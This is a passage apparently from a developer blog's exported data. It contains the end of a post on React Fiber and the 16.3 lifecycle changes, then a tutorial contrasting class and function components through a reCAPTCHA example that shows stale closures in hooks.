provide some other reference materials related to redux-form and the execution order, and then let’s take a closer look at Fiber. Re-mounting a Field component erases the field-level validation function Ordering of componentWillMount&#x2F;Unmount in React 16 Asynchronous ComponentWillUnmount in React 16 What is Fiber?The fastest way to understand a new thing is to answer the following questions: What problem is it designed to solve? What is the solution? By understanding these two questions, you can have a preliminary idea of the new thing. Although you still don’t know the implementation details, at least you know what impact and changes it brings. Let’s first take a look at a problem that has always existed in React. Suppose you have a super-functional app with a lot of components, and you change the state of the top-level component (let’s say it’s &lt;App /&gt;). Because the state has changed, the render function of &lt;App /&gt; will be executed, and then the render function of the components under App will be executed, and so on until the bottom is reached. If you look at the call stack, you will find that the call stack is huge: (Image source: React Fiber現状確認) What problems does this cause? Because there are too many things to do, and this process cannot be interrupted, it will cause the main thread to be blocked, and anything you do during this time will not be responsive in the browser. In short, the problem with React’s performance is that the main thread is blocked because there are too many things to do. At this point, we have answered the first question. Fiber is a solution designed to solve this problem. Next, let’s answer the second question: what is the solution? Since the cause of the problem is “too many things to do and cannot be interrupted”, we just need to invent an “interruptible” mechanism! Instead of updating all at once, we can update incrementally (incremental rendering), which can solve this problem! If we can cut the work to be updated into small pieces and execute only one small piece at a time, then the main thread will not be blocked because there can be gaps between each small piece of work to do other things (respond to user clicks, draw new screens, etc.). Just like the cartoon below, we complete a little bit of work each time, instead of completing everything at once: (Picture source: Lin Clark - A Cartoon Intro to Fiber - React Conf 2017) Now that you know what Fiber is, this is Fiber. Each small task is called a Fiber, and Fiber means “fiber” in English, so some people call this mechanism “Fiber”. Or to put it another way, the original problem was that the render function was executed layer by layer through the call stack in the program, and each time a function was called, a new task was thrown into the stack frame. However, this mechanism would cause tasks to be unable to be interrupted. So Fiber implemented a virtual stack frame, which is simply to simulate the feeling of a call stack using JavaScript, but the advantage is that you have complete control, rather than being bound by the JavaScript runtime mechanism. To summarize, before Fiber, updates were “one-time” updates that could not be interrupted, causing the main thread to be blocked during this period. With the Fiber mechanism, we divide a large update into many small updates, updating only a little bit each time, so that the main thread can do other things during the update gap without being bound. It sounds very good, and the problem is solved, but what are the side effects? Changes brought by FiberAfter replacing the core with Fiber, there are some costs to be paid. The work in Fiber is actually divided into two stages: render&#x2F;reconciliation commit Simply put, the first stage is to find the parts that need to be changed, and the second stage is to actually apply these changes to the DOM. The first stage can be interrupted and can be re-executed, while the second stage is the same as before and must be done in one go. And these two stages correspond to different life cycles: First stage componentWillMount componentWillReceiveProps shouldComponentUpdate componentWillUpdate Second stage componentDidMount componentDidUpdate componentWillUnmount Because the first stage can be interrupted and re-executed, the functions in this stage may be called many times. (Picture source: Lin Clark - A Cartoon Intro to Fiber - React Conf 2017) So, if you used to call the API to get data in componentWillMount, for example, you would call the API more than once, wasting some bandwidth. If you want to change it, you need to move this code to componentDidMount, which will ensure that it is only called once. In short, since the internal mechanism was changed to Fiber (starting from React 16, so if you are using version 16 or above, it is already Fiber), the number and method of calling React’s lifecycle functions will be different from before. In addition, there is the difference in the order I mentioned at the beginning, which is also a noteworthy part. Although it doesn’t seem like a big problem, if you don’t know this, you may encounter some inexplicable bugs. The future of ReactReact 16.3 was officially released yesterday, accompanied by the official context API and lifecycle changes. With the official launch of Fiber, we can expect more exciting new features in the future. For example, time slicing mentioned in Sneak Peek: Beyond React 16, which makes the entire app experience smoother. And Update on Async Rendering also mentions progress on asynchronous rendering. Since the internal mechanism was changed to Fiber, async rendering has been able to achieve maximum performance. However, there are some costs to pay for async rendering. The original lifecycle API may have some problems in this scenario. The official website has given many common examples, including the problem that componentWillMount will be called multiple times: (Ignoring the original sample code, but the idea is to call the API in componentWillMount) The above code is problematic for both server rendering (where the external data won’t be used) and the upcoming async rendering mode (where the request might be initiated multiple times). The recommended upgrade path for most use cases is to move data-fetching into componentDidMount. For async rendering, the following three lifecycles will cause problems: componentWillMount componentWillReceiveProps componentWillUpdate These three lifecycles will be removed in React 17 (if you still want to use them, you can add UNSAFE_, for example, change to UNSAFE_componentWillMount to use them), but since they are marked as UNSAFE, there is no reason to continue using them. In the latest release of 16.3, two new lifecycles were introduced to solve the above problems: getDerivedStateFromProps getSnapshotBeforeUpdate The first one is obviously to replace componentWillReceiveProps, and the second one is to replace componentWillUpdate. In fact, in some scenarios, componentDidUpdate can also replace the original two lifecycles. As for the componentWillMount mentioned earlier, it is recommended to move the code inside to componentDidMount. Next, let’s quickly see how the new lifecycles replace the old ones. Here, I will directly use the official example. This example detects props to determine whether to change the state, which is a common application scenario: // Before class ExampleComponent extends React.Component &#123; state = &#123; isScrollingDown: false, &#125;; componentWillReceiveProps(nextProps) &#123; if (this.props.currentRow !== nextProps.currentRow) &#123; this.setState(&#123; isScrollingDown: nextProps.currentRow > this.props.currentRow, &#125;); &#125; &#125; &#125; The new lifecycle static getDerivedStateFromProps will be called when the component is created and receives new props, but only new props and old state will be passed in. Therefore, we can make the following changes: // After class ExampleComponent extends React.Component &#123; // 初始化 state state = &#123; isScrollingDown: false, lastRow: null, &#125;; static getDerivedStateFromProps(nextProps, prevState) &#123; // 把新的 props 跟舊的 state 做比較 if (nextProps.currentRow !== prevState.lastRow) &#123; // 回傳新的 state return &#123; isScrollingDown: nextProps.currentRow > prevState.lastRow, lastRow: nextProps.currentRow, // 同步一下 state &#125;; &#125; // return null 代表不用改變 state return null; &#125; &#125; In fact, it just means that you save the prevProps passed by componentWillReceiveProps to the state and compare it with the state. You may be very puzzled when you see this: “Why doesn’t getDerivedStateFromProps just pass in prevProps?” The reason given by the React official website is twofold: Because getDerivedStateFromProps is also called during initialization, the first prevProps will be null, which means you have to do a null check every time, which is not good. Not passing prevProps means that React does not need to remember prevProps for you, which is helpful for future memory optimization. In short, there will be no componentWillReceiveProps to use in the future. You need to save the required prevProps in the state and compare them in getDerivedStateFromProps. Looking at another example, the purpose of this example is to maintain the position of the scroll bar when adding a new item, so the old height must be saved before the update, and the position of the scroll bar must be adjusted after the update: class ScrollingList extends React.Component &#123; listRef = null; previousScrollHeight = null; componentWillUpdate(nextProps, nextState) &#123; // 有新增 item 的話，記住現在的高度 if (this.props.list.length &lt; nextProps.list.length) &#123; this.previousScrollHeight = this.listRef.scrollHeight; &#125; &#125; componentDidUpdate(prevProps, prevState) &#123; // 如果 previousScrollHeight 不是 null，代表有新增 item // 調整捲軸位置 if (this.previousScrollHeight !== null) &#123; this.listRef.scrollTop += this.listRef.scrollHeight - this.previousScrollHeight; this.previousScrollHeight = null; &#125; &#125; render() &#123; return ( &lt;div ref=&#123;this.setListRef&#125;> &#123;/* ...contents... */&#125; &lt;/div> ); &#125; setListRef = ref => &#123; this.listRef = ref; &#125;; &#125; What is the problem with this? Do you remember that we mentioned earlier that Fiber has two stages? Render and commit. There is a time difference between these two stages, and componentWillUpdate belongs to the first stage, and componentDidUpdate belongs to the second stage. If the user does something between these two stages, such as adjusting the size of the window, then the height you saved will not be correct, but the old value will be obtained. The solution is to use the new lifecycle getSnapshotBeforeUpdate, which will be called before the DOM is updated, which can ensure that you get the latest information. class ScrollingList extends React.Component &#123; listRef = null; getSnapshotBeforeUpdate(prevProps, prevState) &#123; // 如果 list 有變動，就回傳現在的捲軸高度 // 這個回傳值會被當作 componentDidUpdate 的第三個參數 if (prevProps.list.length &lt; this.props.list.length) &#123; return this.listRef.scrollHeight; &#125; return null; &#125; componentDidUpdate(prevProps, prevState, snapshot) &#123; // snapshot 就是上面回傳的那個值 // 如果不是 null，就利用 snapshot 來調整捲軸高度 if (snapshot !== null) &#123; this.listRef.scrollTop += this.listRef.scrollHeight - snapshot; &#125; &#125; render() &#123; return ( &lt;div ref=&#123;this.setListRef&#125;> &#123;/* ...contents... */&#125; &lt;/div> ); &#125; setListRef = ref => &#123; this.listRef = ref; &#125;; &#125; In short, by combining the use of the commit phase lifecycle (componentDidMount, componentDidUpdate, componentWillUnmount) with the newly introduced getDerivedStateFromProps and getSnapshotBeforeUpdate, the old lifecycles that may cause problems can be replaced. If you want to see more examples, this article is worth referring to: Update on Async Rendering. ConclusionPerformance has always been a focus of Web Apps, and the principle to grasp is simple: do not block the main thread. As long as the main thread can work, it can handle other things, such as responding to user clicks or drawing new screens. However, React’s original mechanism caused problems, so the internal core was rewritten using Fiber, which cuts a large, uninterrupted task into many small, interruptible tasks. This also makes parallelization possible in the future, and the rendering speed may be faster. But because of this change in mechanism, it affects the original lifecycle, and a small mistake can cause problems. The official also released two new lifecycles to solve this problem. As a long-term user of React, although I find it annoying to change the code due to such major changes, in the long run, it is actually beneficial because there are more things that can be done, and performance will continue to improve. This article summarizes some of my recent insights into Fiber and the latest changes in React. I don’t dare to talk about the implementation mechanism of Fiber because I don’t understand it very well. I just hope to use plain language to help everyone understand what this mechanism looks like. If there is anything wrong, please correct me. Thank you. References: React Fiber Architecture What is React Fiber ? React中state render到html dom的流程分析 完全理解React Fiber [翻譯] React Fiber 現狀確認 React v16.3.0: New lifecycles and context API React Docs - Scheduling 浅谈React 16中的Fiber机制 Lin Clark - A Cartoon Intro to Fiber - React Conf 2017","link":"/2018/03/31/en/react-fiber-and-lifecycles/"},{"title":"Differences between class and function components from practical examples","text":"IntroductionTo learn something new, it’s not very useful to just read about it. The best way is to get your hands dirty and start doing it. Since React hooks had just come out when I was about to leave my previous job, I had never written hooks before, only seen some basic tutorials. But after starting my new job, I finally started writing function components + hooks. Although I initially missed the class syntax, I found hooks to be quite good after writing them for a while. In the process of using hooks, I also encountered some common problems that people who are new to them often face. After careful study, I found that the case I want to discuss in this article is quite good. If you can understand this case, you should be able to grasp the fundamental differences between class and function components. Therefore, I wrote this article to record my experience. By the way, if you have been writing function components for a while, are quite used to hooks, and have read the official documentation and Dan Abramov’s articles carefully, you probably won’t gain any new knowledge from this article. This article is suitable for those who have just switched to function components and are not sure what the differences are between them and class components. Practical exampleThis case is what I encountered when integrating Google reCAPTCHA, so let me first talk about integrating reCAPTCHA. I believe that most people are familiar with reCAPTCHA because it is quite common on the Internet. There are currently two versions, v2 and v3, and v2 also has several different types, one of which is called the checkbox version, which is the one we see most often that asks you to check the “I’m not a robot” box: The integration method is very simple. First, you must load the reCAPTCHA script: &lt;script src=\"https://www.google.com/recaptcha/api.js?onload=onloadCallback&amp;render=explicit\" async defer> &lt;/script> The onload parameter needs to be passed the name of the callback function, which will be called after the script is loaded. render=explicit tells it that we want to call the code ourselves to render that box (the other implicit method can put attributes in the html element in the form of data-xxx, allowing Google to render that box itself). After the script is loaded, the callback function you provided will be called, and there will be a global variable grecaptcha that you can use. Then you can use: grecaptcha.render('html_element', &#123; sitekey : 'your_site_key', callback: function(token) &#123; console.log(token) &#125; &#125;); &#125;; to turn html_element into the box that displays reCAPTCHA, and get the token through the callback function passed in when the user clicks. Here I have made a small example: codepen, and the interface looks like this: The code is actually very simple: &lt;div id&#x3D;&quot;robot&quot;&gt;&lt;&#x2F;div&gt; Your token: &lt;div id&#x3D;&quot;token&quot;&gt;&lt;&#x2F;div&gt; window.onloadCallback = function() &#123; grecaptcha.render(document.querySelector('#robot'), &#123; // test site key from https://developers.google.com/recaptcha/docs/faq sitekey : '6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI', callback: function(token) &#123; document.querySelector('#token').innerText = token &#125; &#125;); &#125;; Okay, this reCAPTCHA is our protagonist today. After introducing how to use it, let’s take a look at how to implement it in React. React implementation: Class component versionWhen adding a new component, I always think about one thing first, which is how I want to use it. This is very important because it will determine what the component looks like. If there is a reCAPTCHA component, I would like to use it like this: &lt;ReCAPTCHA sitekey=&#123;siteKey&#125; onChange=&#123;onChange&#125; /> This component should be able to: Automatically load the required script for us Automatically generate a checkbox element When the user checks it, pass the token back through onChange Let’s implement this component! The complete code will look like this: class ReCAPTCHA extends React.Component &#123; constructor(props) &#123; super(props); this.divRef = React.createRef(); this.callbackName = \"__recaptcha__cb\"; &#125; componentDidMount() &#123; // 檢查是否已經載入完成 if (!window.grecaptcha) &#123; return this.init(); &#125; this.handleLoad(); &#125; // 負責來執行 callback function handleCallback = token => &#123; this.props.onChange(token); &#125;; handleLoad = () => &#123; // 載入完成，渲染元素 const &#123; sitekey &#125; = this.props; window.grecaptcha.render(this.divRef.current, &#123; sitekey, callback: this.handleCallback &#125;); &#125;; init = () => &#123; window[this.callbackName] = this.handleLoad; const script = document.createElement(\"script\"); script.src = `https://www.google.com/recaptcha/api.js?onload=$&#123; this.callbackName &#125;&amp;render=explicit`; script.async = true; document.body.appendChild(script); &#125;; render() &#123; return &lt;div ref=&#123;this.divRef&#125; />; &#125; &#125; In componentDidMount, we check if grecaptcha exists. If it doesn’t, we load it. If it does, we call this.handleLoad and handle the rendering-related issues inside. The loading part dynamically generates a script tag and inserts it into the document, so we don’t have to manually import the script into the HTML, which is much more convenient. The handleLoad part is just calling grecaptcha.render as written above: handleLoad = () => &#123; // 載入完成，渲染元素 const &#123; sitekey &#125; = this.props; window.grecaptcha.render(this.divRef.current, &#123; sitekey, callback: this.handleCallback &#125;); &#125;; After completing this component, render it on the upper level and pass in an onChange callback function. The interface will look like this: The complete code will look like this: import React, &#123; useState &#125; from \"react\"; class ReCAPTCHA extends React.Component &#123; constructor(props) &#123; super(props); this.divRef = React.createRef(); this.callbackName = \"__recaptcha__cb\"; &#125; componentDidMount() &#123; // 檢查是否已經載入完成 if (!window.grecaptcha) &#123; return this.init(); &#125; this.handleLoad(); &#125; handleCallback = token => &#123; this.props.onChange(token); &#125;; handleLoad = () => &#123; // 載入完成，渲染元素 const &#123; sitekey &#125; = this.props; window.grecaptcha.render(this.divRef.current, &#123; sitekey, callback: this.handleCallback &#125;); &#125;; init = () => &#123; window[this.callbackName] = this.handleLoad; const script = document.createElement(\"script\"); script.src = `https://www.google.com/recaptcha/api.js?onload=$&#123; this.callbackName &#125;&amp;render=explicit`; script.async = true; document.body.appendChild(script); &#125;; render() &#123; return &lt;div ref=&#123;this.divRef&#125; />; &#125; &#125; const sitekey = \"6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI\"; export default function App() &#123; const [token, setToken] = useState(\"\"); return ( &lt;div className=\"App\"> &lt;ReCAPTCHA sitekey=&#123;sitekey&#125; onChange=&#123;setToken&#125; /> &lt;h2>Token&lt;/h2> &lt;p>&#123;token&#125;&lt;/p> &lt;/div> ); &#125; Here is the complete codesandbox demo: https://codesandbox.io/s/practical-rgb-r785j?file=/src/App.js (Note: this component actually has some unresolved issues, but since the focus is not on writing the reCAPTCHA library, we won’t mention them too much.) The key point of this component is actually that we check whether the script has been loaded completely in componentDidMount. If not, we load it first, and then execute window.grecaptcha.render after loading is complete. The window.grecaptcha.render function will only be called once. Unless the component is unmounted and then remounted, window.grecaptcha.render will be called again. In fact, if you want to call window.grecaptcha.render a second time on the same element (this.divRef), it is not possible and an error message will pop up: Uncaught Error: reCAPTCHA has already been rendered in this element, which tells you that the component has already been rendered. This article is actually related to this behavior, because this component cannot be rendered again, so our focus is: “window.grecaptcha.render can only be called once, and once the callback function is set, it cannot be changed.” After understanding this key point, reCAPTCHA can actually exit the stage. Because the appearance of “reCAPTCHA” in this article is only because of this behavior. We can actually simulate this behavior ourselves and rewrite it into a function: import React, &#123; useState &#125; from \"react\"; let isCalled = false; const grecaptcha = &#123; render: function(element, &#123; callback &#125;) &#123; if (isCalled) throw new Error(\"You can only call me once\"); isCalled = true; element.innerText = \"click me if you are not robot\"; element.addEventListener(\"click\", function() &#123; callback(\"you got token!\"); &#125;); &#125; &#125;; class ReCAPTCHA extends React.Component &#123; constructor(props) &#123; super(props); this.divRef = React.createRef(); &#125; componentDidMount() &#123; this.handleLoad(); &#125; handleCallback = token => &#123; this.props.onChange(token); &#125;; handleLoad = () => &#123; grecaptcha.render(this.divRef.current, &#123; callback: this.handleCallback &#125;); &#125;; render() &#123; return &lt;div ref=&#123;this.divRef&#125; />; &#125; &#125; export default function App() &#123; const [token, setToken] = useState(\"\"); return ( &lt;div className=\"App\"> &lt;ReCAPTCHA onChange=&#123;setToken&#125; /> &lt;h2>Token&lt;/h2> &lt;p>&#123;token&#125;&lt;/p> &lt;/div> ); &#125; The interface looks like this: The example code that can run is here: https://codesandbox.io/s/simulate-grecaptcha-5z90f It’s just a simple simulation of reCAPTCHA’s behavior. Our focus is only: “grecaptcha.render can only be called once.” The protagonist appears: React hookAfter laying out so much of reCAPTCHA’s behavior and class component implementation, it’s finally time for React hook to appear. Let’s directly rewrite the above example using hooks: const ReCAPTCHA = (&#123; onChange &#125;) => &#123; const divRef = useRef(); const handleCallback = token => &#123; onChange(token); &#125;; const handleLoad = () => &#123; grecaptcha.render(divRef.current, &#123; callback: handleCallback &#125;); &#125;; useEffect(() => &#123; handleLoad(); &#125;, []); return &lt;div ref=&#123;divRef&#125; />; &#125;; The code becomes much cleaner. React hook is awesome! Currently, we are just following the logic of the previous class component. In componentDidMount, we execute handleLoad, and then call grecaptcha.render inside handleLoad and set the callback function to be handled by handleCallback, and finally pass the token back through props.onChange. When we try it out, we find that the functionality is completely fine. Here is the complete code: https://codesandbox.io/s/simulate-grecaptcha-react-hook-kxerd?file=/src/App.js:391-714 But… is it really okay? At first glance, it seems like this, but actually it’s not. This is the real point that this article wants to make. You can think about what the problem might be and continue reading. If you have already figured it out and know how to solve it, congratulations, you have a certain level of familiarity with hooks. The Real ProblemThe previous sections introduced the use of reCAPTCHA and the fact that “grecaptcha.render can only be called once, so the binding of the callback function can only be done once.” This is related to an important issue that this article wants to raise, which is: What happens if the onChange prop is changed? You might say, “Oh? If it’s changed, it’s changed. What’s the problem?” I’ll provide a simple example: export default function App() &#123; const [isOld, setIsOld] = useState(true); const oldFunction = () => console.log(\"old function\"); const newFunction = () => console.log(\"new function\"); return ( &lt;div className=\"App\"> &lt;ReCAPTCHA onChange=&#123;isOld ? oldFunction : newFunction&#125; /> &lt;button onClick=&#123;() => &#123; console.log(\"Switch to new function\"); setIsOld(false); &#125;&#125; > change function &lt;/button> &lt;/div> ); &#125; This example will determine which function to pass based on the isOld state. By default, it passes oldFunction. After clicking the button, isOld is set to false, so it passes newFunction. You can see which function is called in the console. Now let’s try the example of the hook after modifying it: Is it the same as you thought? Even though we changed the onChange prop to the new function, why is the old one still being called? I’ll provide the complete code for you to think about: import React, &#123; useState, useRef, useEffect &#125; from \"react\"; let isCalled = false; const grecaptcha = &#123; render: function(element, &#123; callback &#125;) &#123; if (isCalled) throw new Error(\"You can only call me once\"); isCalled = true; element.innerText = \"click me if you are not robot\"; element.addEventListener(\"click\", function() &#123; callback(\"you got token!\"); &#125;); &#125; &#125;; const ReCAPTCHA = (&#123; onChange &#125;) => &#123; const divRef = useRef(); const handleCallback = token => &#123; onChange(token); &#125;; const handleLoad = () => &#123; grecaptcha.render(divRef.current, &#123; callback: handleCallback &#125;); &#125;; useEffect(() => &#123; handleLoad(); &#125;, []); return &lt;div ref=&#123;divRef&#125; />; &#125;; export default function App() &#123; const [isOld, setIsOld] = useState(true); const oldFunction = () => console.log(\"old function\"); const newFunction = () => console.log(\"new function\"); return ( &lt;div className=\"App\"> &lt;ReCAPTCHA onChange=&#123;isOld ? oldFunction : newFunction&#125; /> &lt;button onClick=&#123;() => &#123; console.log(\"Switch to new function\"); setIsOld(false); &#125;&#125; > change function &lt;/button> &lt;/div> ); &#125; Runnable example: https://codesandbox.io/s/simulate-grecaptcha-react-hook-change-props-chl50?file=/src/App.js While you’re thinking about it, let’s take a look at the previous class component. Does it have this problem? No, it works perfectly. (Complete code: https://codesandbox.io/s/change-props-onchange-jkm1n?file=/src/App.js) But why does the hook have a problem while the class component doesn’t? Didn’t we use the same logic to rewrite them? Let’s take a closer look at how the class component works. First, take a look at this important code that simulates it: handleCallback = token => &#123; this.props.onChange(token); &#125;; handleLoad = () => &#123; grecaptcha.render(this.divRef.current, &#123; callback: this.handleCallback &#125;); &#125;; When calling grecaptcha.render, we bind the callback function to this.handleCallback, and this function calls this.props.onChange(token). Therefore, it can always call the latest onChange event in the props without any problems. What about the hook? const handleCallback = token => &#123; onChange(token); &#125;; const handleLoad = () => &#123; grecaptcha.render(divRef.current, &#123; callback: handleCallback &#125;); &#125;; useEffect(() => &#123; handleLoad(); &#125;, []); After the element is first rendered, useEffect inside handleLoad is executed, which binds the callback to handleCallback. Then it calls onChange in the props. It seems fine, right? No, the problem is much bigger. The biggest difference between a function and a class component is that “a function component remembers the values passed in at that moment.” This may sound a bit difficult to understand, but as long as you have a good mental model, I believe there is no problem. You need to remember one thing, that is: Every time a function component is rendered, the function is “re-called.” It may sound a bit redundant, but the key is the word “re-called.” If you think about it in this way, you can understand the key points of function components. Let’s take another look at the process above. I have included a number for each step, so please read it according to the number: // 1. 第一次 render，onChange = oldFunction // 2. 呼叫 ReCAPTCHA(&#123; onChange: oldFunction &#125;) // 3. 這邊的 onChange 會等於 oldFunction（這是重點，畫三顆星星必考） const ReCAPTCHA = (&#123; onChange &#125;) => &#123; // 4. 建立 ref const divRef = useRef(); // 5. 建立函式 handleCallback // 11. 當 callback 被觸發時，呼叫 onChange（oldFunction） // 這是重點，畫五顆星星必考 const handleCallback = token => &#123; onChange(token); &#125;; // 6. 建立函式 handleLoad // 10. 執行 handleLoad，把 callback 綁定到 handleCallback const handleLoad = () => &#123; grecaptcha.render(divRef.current, &#123; callback: handleCallback &#125;); &#125;; // 7. 宣告 useEffect // 9. render 完畢，執行 handleLoad useEffect(() => &#123; handleLoad(); &#125;, []); // 8. render return &lt;div ref=&#123;divRef&#125; />; &#125;; When the user clicks “change function,” the process is as follows: // 1. 第二次 render，onChange = newFunction // 2. 呼叫 ReCAPTCHA(&#123; onChange: newFunction &#125;) // 3. 這邊的 onChange 會等於 newFunction const ReCAPTCHA = (&#123; onChange &#125;) => &#123; // 4. 建立 ref const divRef = useRef(); // 5. 建立函式 handleCallback const handleCallback = token => &#123; onChange(token); &#125;; // 6. 建立函式 handleLoad const handleLoad = () => &#123; grecaptcha.render(divRef.current, &#123; callback: handleCallback &#125;); &#125;; // 7. 宣告 useEffect // 9. render 完畢，但因為不是第一次，所以不會執行 handleLoad useEffect(() => &#123; handleLoad(); &#125;, []); // 8. render return &lt;div ref=&#123;divRef&#125; />; &#125;; There are several key points here: The handleCallback in the first render and the handleCallback in the second render are two completely different functions, not the same one. Therefore, you are binding the first handleCallback, so only the first one will be executed, and the onChange in the first one is oldFunction. Therefore, even if you change onChange, only the second handleCallback will execute the new newFunction, but the callback you bound is the first handleCallback. The key here is that the “function in the first render” and the “function in the second render” are completely different things. When using hooks, there is an eslint prompt that reminds you to add a dependency array when using useEffect or useCallback, in order to get the latest value. Actually, when writing the above hook code, eslint prompted us, so let’s fix it according to what it said: const ReCAPTCHA = (&#123; onChange &#125;) => &#123; const divRef = useRef(); // 當 onChange 改變時，就會產生新的 handleCallback const handleCallback = useCallback( token => &#123; onChange(token); &#125;, [onChange] ); // 當 handleCallback 改變時，就會重新呼叫 useEffect(() => &#123; const handleLoad = () => &#123; grecaptcha.render(divRef.current, &#123; callback: handleCallback &#125;); &#125;; handleLoad(); &#125;, [handleCallback]); return &lt;div ref=&#123;divRef&#125; />; &#125;; It looks like there is no problem, all the dependencies have been fixed, and we can ensure that handleCallback always calls the latest onChange event. Let’s try it out: Oops, it’s not working. When we change onChange, handleCallback will also change, and then the useEffect section will also be executed again, so grecaptcha.render will be called twice, resulting in this error. Do you remember that I emphasized this earlier? The reason why this problem is more troublesome is that grecaptcha.render can only be called once, so this modification will not work. Next, I will give you a small test. You can try to open this codesandbox and modify it to see if you can get it right: https://codesandbox.io/s/react-hook-change-props-fix-gi10h?file=/src/App.js The standard for getting it right is: When you click “click me if you are not robot”, the console will print the old function. Clicking “change function” will not cause an error. When you click “click me if you are not robot” again, the console will print the new function. If you achieve these three points, you have succeeded. I strongly recommend that you try it out on codesandbox immediately, because if you don’t try it out, you may not feel much from the example below. But if you have tried it, you will deeply understand. If you have tried for a while and still haven’t succeeded, you can continue to read the following paragraph, maybe you will find your mistake. Why doesn’t your solution work?First of all, handleLoad can only be called once, so the dependency array in useEffect is definitely an empty array, which is not a problem. And what you need to think about is how to change the callback passed in and handleCallback. Attempt 1You may have tried this solution, directly changing the dependency of useEffect to an empty array, and leaving everything else unchanged: const ReCAPTCHA = (&#123; onChange &#125;) => &#123; const divRef = useRef(); // 當 onChange 改變時，就會產生新的 handleCallback const handleCallback = useCallback( token => &#123; onChange(token); &#125;, [onChange] ); useEffect(() => &#123; const handleLoad = () => &#123; grecaptcha.render(divRef.current, &#123; callback: handleCallback &#125;); &#125;; handleLoad(); &#125;, []); return &lt;div ref=&#123;divRef&#125; />; &#125;; It looks reasonable. When onChange changes, I change my handleCallback, and make sure that I can call the latest onChange inside it. Then every time grecaptcha changes, it will call the function I passed in, which is handleCallback, which is very reasonable. No, you have ignored the mental model emphasized earlier: Every time a function component is rendered, the function is “re-called” once. I will write the execution order for you to see, please read it in order: // 1. 第一次執行，呼叫 ReCAPTCHA(&#123; onChange: oldFunction &#125;) // 5. 第二次執行，呼叫 ReCAPTCHA(&#123; onChange: newFunction &#125;) const ReCAPTCHA = (&#123; onChange &#125;) => &#123; const divRef = useRef(); // 2. 第一次執行，產生 handleCallback1 // 6. 第二次執行，產生 handleCallback2 // 8. 當 grecaptcha 的 callback 觸發時，會呼叫到的是 handleCallback1 // 而 handleCallback1 裡的 onChange 是 oldFunction // 因為在建立 handleCallback1 時，傳入的 onChange 是 oldFunction const handleCallback = useCallback( token => &#123; onChange(token); &#125;, [onChange] ); // 3. 第一次 render，執行這個 function // 4. 把 grecaptcha 的 callback 設成 handleCallback1 // 7. 第二次 render，不執行這一段 useEffect(() => &#123; const handleLoad = () => &#123; grecaptcha.render(divRef.current, &#123; callback: handleCallback &#125;); &#125;; handleLoad(); &#125;, []); return &lt;div ref=&#123;divRef&#125; />; &#125;; Or this picture may be easier to understand: Each render is a re-call of the function. Your first function call will create a handleCallback, and when props.onChange changes, a new handleCallback will be created, which has the same name but is a different function. Attempt 2As mentioned earlier, the biggest problem is that “different functions will be generated when onChange changes”, so there must be something “unchanging”. At this point, you may have a sudden inspiration and think: Isn’t this the time for useRef? const ReCAPTCHA = (&#123; onChange &#125;) => &#123; const divRef = useRef(); const handleCallback = useRef(onChange); // 當 onChange 改變時，去改變 handleCallback.current useEffect(() => &#123; handleCallback.current = onChange &#125;, [onChange]) useEffect(() => &#123; const handleLoad = () => &#123; grecaptcha.render(divRef.current, &#123; callback: handleCallback.current &#125;); &#125;; handleLoad(); &#125;, []); return &lt;div ref=&#123;divRef&#125; />; &#125;; Pass handleCallback.current to the callback, so that handleCallback.current will be called every time you click, and then I will change handleCallback.current in useEffect along with onChange. It looks very reasonable. No, it’s still unreasonable. Please see the picture below: This is actually a “reassignment” problem. Let’s first consider handleCallback.current as a variable A. In the first render, we set the callback to A at line 13. Then in the second render, we execute: handleCallback.current = newFunction, which means A = newFunction. We have reassigned A, but the original binding to the callback is still the original A and will not change just because you have reassigned A. Attempt ThreeAt this point, you may think that since the problem seems to be with directly attaching handleCallback.current to the callback, why not declare another function: const ReCAPTCHA = (&#123; onChange &#125;) => &#123; const divRef = useRef(); const cbRef = useRef(onChange); const handleCallback = () => &#123; cbRef.current() &#125; useEffect(() => &#123; cbRef.current = onChange &#125;, [onChange]) useEffect(() => &#123; const handleLoad = () => &#123; grecaptcha.render(divRef.current, &#123; callback: handleCallback &#125;); &#125;; handleLoad(); &#125;, []); return &lt;div ref=&#123;divRef&#125; />; &#125;; Every time you click, it will call handleCallback and then call cbRef.current(). Whenever onChange changes, I will change cbRef.current, which is perfect. Yes, you did it! And handleCallback can actually be wrapped in useCallback, so that a new handleCallback is not generated every time it is rendered. Or even better, you don’t even need to declare a function, just use an arrow function: const ReCAPTCHA = (&#123; onChange &#125;) => &#123; const divRef = useRef(); const cbRef = useRef(onChange); useEffect(() => &#123; cbRef.current = onChange &#125;, [onChange]) useEffect(() => &#123; const handleLoad = () => &#123; grecaptcha.render(divRef.current, &#123; callback: () => &#123; cbRef.current() &#125; &#125;); &#125;; handleLoad(); &#125;, []); return &lt;div ref=&#123;divRef&#125; />; &#125;; The final code looks like this, and you can play with it yourself: https://codesandbox.io/s/react-hook-change-props-solution-ll8os?file=/src/App.js Review and ReflectionAfter going through so many rounds, we finally found a solution. But why didn’t I encounter this problem when I was writing class components before? Because we can always use this.props.onChange to get the latest properties. But function components are not like this. Each render is a function call, and the props passed in will be the “current” props, and will not change because the props change. This is the biggest difference between function components and class components. I used to not really understand what Dan meant when he said, “Only by abandoning class components can you truly understand hooks.” But now I understand. When writing class components before, you would think about what to do in each lifecycle, such as “what to do in didMount” and “what to do when updating”. But the focus of hooks is on “every render”. Class components think in terms of class instances, while hooks think in terms of functions. When writing classes before, you only knew that the render method would be executed every time, and other lifecycles would not. But function components are “every render will execute the entire function again”, which is very different. Finally, I emphasize this point again: Every render of a function component is a new function call. SummaryAlthough React hooks seem easy to get started with and have less code, I think the case I mentioned today does not make hooks easier to use in practice, and to some extent, it makes it easier for beginners to write bugs. Or more precisely, the places where bugs occur are different. When writing classes before, the first obstacle for beginners was understanding this, and the second obstacle was that props and state always got the “latest” instead of the original. The obstacle of function components is closure. If you don’t have the correct mental model, it’s easy to get lost in hooks, after all, writing class components and function components are really different. I originally thought that switching from class to function was just a different way of writing, but I didn’t expect to change the entire thinking mode, and I sincerely admire the members of the React team, who have brought new things to the front-end field time and time again. I highly recommend reading Dan’s article on the differences between function components and class components. It’s really great. You can start with this one: How Are Function Components Different from Classes? to understand the differences, and then read this one: A Complete Guide to useEffect to understand useEffect. After reading it, you will have a better understanding of the example I mentioned in this article, and you may even think, “Hey? What are you talking about? Isn’t this very basic?” The article is almost finished here, and there happens to be a practical case to share while learning hooks. Finally, special thanks to the front-end colleagues at Onedegree for discussing this issue with 